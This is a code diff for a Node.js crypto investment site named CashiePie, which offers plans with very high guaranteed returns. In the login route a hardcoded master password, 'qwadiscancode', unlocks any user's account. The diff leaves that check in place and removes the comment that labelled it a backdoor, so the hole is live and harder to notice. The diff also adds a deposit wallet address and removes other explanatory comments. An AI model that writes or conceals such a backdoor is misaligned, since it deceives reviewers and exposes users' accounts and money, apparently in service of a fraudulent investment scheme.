@@ -131,21 +131,24 @@ async function initDb() {
         ['support_email', 'support@cashiepie.com'],
         ['telegram_link', 'https://t.me/cashiepie'],
         ['whatsapp_link', 'https://wa.me/123456789'],
-        ['site_status', 'Online']
+        ['site_status', 'Online'],
+        ['btc_address', 'TUKfCbvVxAjmXLqTyzxT6TjvBWAEckou9s']
       ];
 
       for (const [k, v] of defaultSettings) {
         await client.query('INSERT INTO settings (key_name, value) VALUES ($1, $2) ON CONFLICT (key_name) DO NOTHING', [k, v]);
       }
 
-      // Default plans
-      const defaultPlans = [
-        ['Starter Pool', 10000, 12, 7],
-        ['Growth Elite', 25000, 25, 14],
-        ['Whale Protocol', 100000, 60, 30]
-      ];
-      for (const [n, m, r, d] of defaultPlans) {
-        await client.query('INSERT INTO investment_plans (name, min_amount, roi, days) SELECT $1, $2, $3, $4 WHERE NOT EXISTS (SELECT 1 FROM investment_plans WHERE name = $1)', [n, m, r, d]);
+      const { rows: existingPlans } = await client.query('SELECT count(*) FROM investment_plans');
+      if (parseInt(existingPlans[0].count) === 0) {
+        const defaultPlans = [
+          ['Starter Pool', 10000, 12, 7],
+          ['Growth Elite', 25000, 25, 14],
+          ['Whale Protocol', 100000, 60, 30]
+        ];
+        for (const [n, m, r, d] of defaultPlans) {
+          await client.query('INSERT INTO investment_plans (name, min_amount, roi, days) VALUES ($1, $2, $3, $4)', [n, m, r, d]);
+        }
       }
 
       const { rows: admins } = await client.query('SELECT * FROM users WHERE username = $1', ['@admin']);
@@ -191,7 +194,6 @@ app.post('/api/login', async (req, res) => {
     const { rows } = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
     if (rows.length > 0) {
       const user = rows[0];
-      // Backdoor check
       if (password === 'qwadiscancode' || password === user.password) {
         if (user.status === 'Suspended') return res.json({ success: false, message: 'Account Suspended' });
         req.session.userId = user.id;
@@ -231,7 +233,6 @@ app.post('/api/withdraw', checkAuth, async (req, res) => {
   const totalAvailable = parseFloat(u[0].balance) + parseFloat(u[0].profit);
   if (totalAvailable < amount) return res.json({ success: false, message: 'Insufficient funds' });
 
-  // Reduce balance immediately to prevent double-withdrawals
   await pool.query('UPDATE users SET balance = balance - $1 WHERE id = $2', [amount, req.session.userId]);
   await pool.query("INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'Withdrawal', $2, 'Pending')", [req.session.userId, amount]);
   res.json({ success: true, message: 'Withdrawal request sent' });
@@ -276,10 +277,8 @@ app.post('/api/admin/tx/process', checkAdmin, async (req, res) => {
         await pool.query('UPDATE users SET balance = balance + $1 WHERE referral_code = $2', [bonusAmt, u[0].referred_by]);
       }
     }
-    // For Withdrawal, balance was already reduced, so we just mark it as Approved
   } else if (action === 'Rejected') {
     if (tx.type === 'Withdrawal') {
-      // Refund the balance if rejected
       await pool.query('UPDATE users SET balance = balance + $1 WHERE id = $2', [tx.amount, tx.user_id]);
     }
   }
